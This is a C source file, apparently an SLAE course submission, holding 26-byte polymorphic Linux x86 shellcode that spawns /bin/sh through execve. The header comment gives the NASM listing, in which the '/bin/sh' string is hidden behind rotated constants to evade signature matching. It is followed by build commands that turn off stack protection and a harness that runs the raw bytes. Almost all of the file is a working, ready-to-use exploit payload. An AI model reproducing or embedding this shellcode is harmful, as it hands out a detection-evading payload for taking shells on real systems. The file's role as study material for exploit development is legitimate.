/*

################### Description ###################

; Title   : Polymorphic execve /bin/sh - Shellcode
; Author  : Hashim Jawad
; Website : ihack4falafel[.]com
; Twitter : @ihack4falafel
; SLAE ID : SLAE-1115
; Purpose : spawn /bin/sh shell
; OS      : Linux
; Arch    : x86
; Size    : 26 bytes

#################### sh.nasm ######################

global _start

section .text

_start:
	; zero out EAX
	xor eax,eax
	push eax

	; push (/bin/sh) to the stack
	mov edi, 0x343997B7
	rol edi, 1
	push edi
	mov esi, 0xD2C45E5E
	ror esi, 1
	push esi

	; ping kernel!
	lea ebx, [esp]
	mov al,0xb
	int 0x80

################### sh binary #####################

nasm -f elf32 -o sh.o sh.nasm

ld -z execstack -o sh sh.o

##################  Shellcode #####################

objdump -d sh -M intel

###################  Compile  #####################

gcc -fno-stack-protector -z execstack sh.c -o sh

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\xbf\xb7\x97\x39\x34\xd1\xc7\x57\xbe\x5e\x5e\xc4\xd2\xd1\xce\x56\x8d\x1c\x24\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}